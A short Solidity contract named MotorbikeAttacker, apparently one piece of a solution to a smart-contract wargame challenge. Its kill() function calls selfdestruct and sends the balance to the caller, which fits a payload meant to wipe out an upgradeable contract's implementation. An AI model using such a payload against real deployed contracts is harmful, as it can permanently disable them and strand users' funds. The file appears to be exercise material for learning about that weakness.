// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttacker {
    function kill() public {
        selfdestruct(payable(msg.sender));
    }

    function test() public {}
}
